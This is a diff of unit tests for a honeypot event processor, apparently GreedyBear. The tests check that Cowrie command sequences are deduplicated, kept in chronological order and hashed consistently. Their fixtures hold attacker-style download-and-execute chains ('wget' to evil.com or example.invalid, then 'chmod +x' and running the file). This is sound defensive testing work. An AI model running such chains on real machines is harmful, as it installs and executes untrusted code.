@@ -26,8 +26,10 @@ from greedybear.process_event import (
     _process_payload_hashes,
     _process_related_urls,
     _sensor_honeypot_names,
+    _unprocessed_events,
     process_incoming_event,
 )
+from greedybear.utils import hash_command_sequence
 from tests import CustomTestCase, make_api_source, make_sensor, make_user
 
 User = get_user_model()
@@ -302,6 +304,18 @@ class TestProcessCommands(CustomTestCase):
         seq = CommandSequence.objects.first()
         self.assertEqual(seq.commands.count("whoami"), 1)
 
+    def test_whitespace_variants_deduplicated(self):
+        """The same command with different surrounding whitespace is one command.
+
+        Comparing the raw string stores "id" twice and changes the
+        order-sensitive hash, so the sequence no longer matches the one Cowrie
+        recorded for the same session.
+        """
+        _process_commands([self._hit("id"), self._hit(" id  "), self._hit("id\t")])
+
+        seq = CommandSequence.objects.first()
+        self.assertEqual(seq.commands, ["id"])
+
     def test_command_order_preserved(self):
         cmds = ["cd /tmp", "wget http://evil.com", "chmod +x mal", "./mal"]
         _process_commands([self._hit(c) for c in cmds])
@@ -475,6 +489,68 @@ class TestProcessIncomingEvent(CustomTestCase):
         self.assertEqual(self.batch.status, "completed")
         self.assertEqual(self.batch.ioc_count, 1)
         self.assertIsNotNone(self.batch.processed_at)
+
+    @patch(PATCH_UPDATE_SCORES)
+    @patch(PATCH_GET_ATTACK_TYPE, return_value="scanner")
+    @patch(PATCH_IOC_PROCESSOR)
+    @patch(PATCH_IOCS_FROM_HITS)
+    def test_command_sequence_keeps_chronological_order(self, mock_hits, mock_processor_cls, mock_attack, mock_scores_cls):
+        """A command chain only means something in the order the attacker ran it.
+
+        RawEvent orders newest-first, so a fetch without an explicit order hands
+        the worker the chain backwards and the order-sensitive hash then never
+        matches the sequence Cowrie recorded for the same session.
+        """
+        commands = ["cd /tmp", "wget http://example.invalid/mal", "chmod +x mal", "./mal"]
+        base = timezone.now()
+        for offset, command in enumerate(commands):
+            self._make_raw(src_ip="5.6.7.8", timestamp=base + timedelta(seconds=offset), command=command)
+
+        mock_hits.return_value = [make_ioc("5.6.7.8")]
+        processor_instance = MagicMock()
+        processor_instance.add_ioc.return_value = self._mock_ioc("5.6.7.8")
+        mock_processor_cls.return_value = processor_instance
+        mock_scores_cls.return_value = MagicMock()
+
+        process_incoming_event(self.api_source.id, self.batch.task_id)
+
+        sequences = list(CommandSequence.objects.filter(commands__contains=["./mal"]))
+        self.assertEqual(len(sequences), 1, [s.commands for s in sequences])
+        self.assertEqual(sequences[0].commands, commands)
+        self.assertEqual(sequences[0].commands_hash, hash_command_sequence(commands))
+
+    def test_unprocessed_events_query_orders_by_timestamp_then_pk(self):
+        """The tie-break has to be in the query, not in the query plan.
+
+        Measured: dropping `pk` leaves an equal-timestamp fixture green, because
+        PostgreSQL happens to return tied rows in insertion order. Asserting the
+        clause is the only version of this test that can fail when it is removed.
+        """
+        # read the ordering tuple, not the compiled SQL: "pk" is emitted as the
+        # real column name, so a string match would test Django's alias choices
+        self.assertEqual(_unprocessed_events(self.batch).query.order_by, ("timestamp", "pk"))
+
+    @patch(PATCH_UPDATE_SCORES)
+    @patch(PATCH_GET_ATTACK_TYPE, return_value="scanner")
+    @patch(PATCH_IOC_PROCESSOR)
+    @patch(PATCH_IOCS_FROM_HITS)
+    def test_events_sharing_a_timestamp_keep_insertion_order(self, mock_hits, mock_processor_cls, mock_attack, mock_scores_cls):
+        """Same timestamp is not the same order: pk decides, so the result is stable."""
+        commands = ["first", "second", "third"]
+        same_moment = timezone.now()
+        for command in commands:
+            self._make_raw(src_ip="5.6.7.8", timestamp=same_moment, command=command)
+
+        mock_hits.return_value = [make_ioc("5.6.7.8")]
+        processor_instance = MagicMock()
+        processor_instance.add_ioc.return_value = self._mock_ioc("5.6.7.8")
+        mock_processor_cls.return_value = processor_instance
+        mock_scores_cls.return_value = MagicMock()
+
+        process_incoming_event(self.api_source.id, self.batch.task_id)
+
+        sequence = CommandSequence.objects.get(commands__contains=["first"])
+        self.assertEqual(sequence.commands, commands)
 
     @patch(PATCH_UPDATE_SCORES)
     @patch(PATCH_GET_ATTACK_TYPE, return_value="scanner")
